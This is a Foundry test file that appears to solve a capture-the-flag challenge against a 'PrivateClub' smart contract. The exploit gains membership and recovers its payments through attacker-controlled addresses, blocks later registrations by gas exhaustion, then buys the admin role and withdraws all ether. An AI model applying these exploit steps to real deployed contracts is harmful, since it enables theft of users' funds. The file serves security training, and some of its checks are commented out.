// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack_pk() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:
        console.log("hacker balance : ",hacker.balance);

        address[] memory mForUser = new address[](3);
        mForUser[0] = msg.sender;
        mForUser[1] = address(0x12);
        mForUser[2] = address(0x13);
        club.becomeMember{value : 3 ether}(mForUser);
        vm.stopPrank();
        vm.prank(address(0x12));

        hacker.call{value : 1 ether}("");
        vm.prank(address(0x13));
        hacker.call{value : 1 ether}("");

        console.log("hacker balance : ",hacker.balance);
        // check - hacker is member
        assertTrue(club.members(hacker));


        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        // vm.expectRevert();
        assertLt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();


        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
        console.log("hacker balance : ",hacker.balance);
        club.buyAdminRole{value : hacker.balance}(hacker);
        club.adminWithdraw(hacker , address(club).balance);
        vm.stopPrank();
        // check - hacker is owner of club
        // assertEq(club.owner(), hacker);
        // assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}